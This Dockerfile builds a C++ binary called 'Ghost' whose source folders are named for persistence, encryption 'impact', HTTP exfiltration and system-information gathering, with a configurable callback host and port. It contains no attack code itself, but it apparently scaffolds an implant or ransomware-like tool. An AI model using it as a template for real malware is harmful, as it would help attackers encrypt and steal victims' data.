# === BUILD STAGE ===
FROM alpine:edge AS builder

RUN apk add --no-cache g++ git cmake make linux-headers openssl-dev meson curl-dev

WORKDIR /src

COPY CMakeLists.txt .

RUN mkdir -p src/modules/persistence \
             src/modules/impact \
             src/modules/exfiltration \
             src/modules/gathering \
             src/core \
             src/utils \
             src/network

RUN echo "int main() { return 0; }" > src/main.cpp

RUN touch src/modules/Persistence.cpp \
          src/modules/Impact.cpp \
          src/modules/Exfiltration.cpp \
          src/modules/Gathering.cpp \
          src/modules/persistence/RunControl.cpp \
          src/modules/impact/Encryption.cpp \
          src/modules/exfiltration/HttpPost.cpp \
          src/modules/gathering/SystemInfo.cpp

RUN cmake . -DCPR_USE_SYSTEM_CURL=ON -DCPR_BUILD_TESTS=OFF && make -j$(nproc) 

COPY . .

RUN cmake . -DSHADOW_URL=${SHADOW_URL:-127.0.0.1} -DSHADOW_PORT=${SHADOW_PORT:-9999} -DENABLE_DEBUG=ON -DBUILD_SHARED_LIBS=OFF && make -j$(nproc)

# === RUNTIME ===
FROM alpine:edge

RUN apk add --no-cache libstdc++ openssl ca-certificates libcurl

WORKDIR /app

COPY --from=builder /src/bin/Ghost .

CMD ["./Ghost"]
